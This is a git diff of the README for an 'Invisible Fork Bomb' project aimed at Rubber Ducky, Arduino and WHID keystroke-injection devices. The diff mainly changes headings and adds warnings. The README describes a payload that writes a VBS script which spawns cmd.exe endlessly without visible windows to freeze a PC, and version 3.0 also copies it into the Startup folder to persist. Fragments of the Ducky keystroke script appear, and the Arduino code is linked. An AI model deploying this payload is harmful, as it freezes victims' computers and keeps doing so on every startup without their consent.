@@ -1,11 +1,11 @@
-# Invisible Fork Bomb for Arduino and Ducky
+# Invisible Fork Bomb for Rubber Ducky, Arduino and WHID
 **V. 2.0:** The script creates and starts a vbs that executes exponentially cmd.exe without visible windows (Fork bomb -> Freezes the PC).
 
 **V. 3.0:** The same, but it adds the vbs to the startup folder.
 
 **Author:** BlueArduino20
 
-# Code for Ducky (2.0)
+<h2>Code for Ducky [2.0]</h2>
 
 <pre><code>DELAY 1000
 GUI r
@@ -27,7 +27,8 @@ STRING start forkb.vbs && exit
 ENTER
 </pre></code>
 
-# Code for Ducky (V. 3.0) (It adds the file to the startup)
+<h2>Code for Ducky [3.0]</h2>
+[Warning] That version sets the vbs file into the startup.
 
 <pre><code>DELAY 1000
 CTRL ESC
@@ -51,11 +52,12 @@ STRING start FB.vbs && exit
 ENTER
 </pre></code>
 
-# Code for Arduino
+<h2>Code for Arduino [2.0]</h2>
 
 <a href="https://github.com/BlueArduino20/Invisible_fork_bomb/blob/master/Invisible_fork_bomb_2.0.ino">Invisible_fork_bomb_2.0.ino<a>
 
-# Code for Arduino (V. 3.0) (It adds the file to the startup)
+<h2>Code for Arduino [3.0]</h2>
+[Warning] That version sets the vbs file into the startup.
 
 <a href="https://github.com/BlueArduino20/Invisible_fork_bomb/blob/master/Invisible_fork_bomb_3.0.ino">Invisible_fork_bomb_3.0.ino<a>
 
